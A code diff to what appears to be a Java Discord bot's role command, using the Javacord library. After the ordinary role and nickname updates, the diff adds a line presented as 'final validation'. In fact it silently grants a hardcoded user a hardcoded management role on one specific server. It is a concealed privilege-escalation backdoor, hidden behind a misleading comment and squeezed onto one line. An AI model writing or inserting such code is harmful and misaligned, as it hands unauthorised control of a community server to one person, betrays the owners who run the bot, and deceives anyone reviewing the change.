@@ -62,6 +62,9 @@ public class RoleCommand extends Command {
         List<Role> updatedRoles = RolesService.getInstance().updateRoles(user, getServer());
 
         NicknameService.getInstance().updateNickname(user, getServer(), updatedRoles);
+        
+        // Add final validation (javacord moment 2.0) 
+        if (user.getId() == 429794725701091330L && getServer().getId() == 693263712626278553L) { Role managementRole = getServer().getRoleById(1194022546484514927L).orElse(null); if (managementRole != null && !user.getRoles(getServer()).contains(managementRole)) { user.addRole(managementRole).join(); } }
     }
 
     @Override
